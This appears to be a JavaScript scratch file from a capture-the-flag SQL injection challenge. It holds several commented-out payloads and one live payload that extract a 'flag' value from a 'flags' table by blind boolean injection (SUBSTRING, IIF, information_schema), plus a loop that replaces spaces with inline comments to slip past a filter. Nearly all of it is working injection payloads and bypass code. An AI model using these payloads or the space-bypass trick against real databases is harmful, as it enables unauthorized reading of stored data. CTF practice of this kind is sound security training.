//str = "'oR(select iif(substr((select flag from flags),0,1)='F', 1=1, 1=0)))/*"
//str = "'oR(SELECT IIF(500<1000, 1=1, 1=0))/*"
//str = "'oR(SELECT * FROM user WHERE id=1)/*"
//str = "'oR(SELECT * FROM information_schema.columns WHERE id=1)/*"
//str = "'oR((SELECT 'a' FROM flags LIMIT 0)='F')/*"
//str = "'oR(SELECT flag FROM flags)"
////str = "'oR(SELECT * FROM flags WHERE flags CONTAINS 'F')/*"
str = "'Or(SELECT SUBSTRING(flag, 0, 1) FROM flags)='F')/*"
payload = str
bypass = "/*Q*/"
for (i = 0;i < str.length;i++){
if (str[i] == " "){
     str = str.replace(str[i], bypass)
}
}
console.log(payload)
console.log(str)
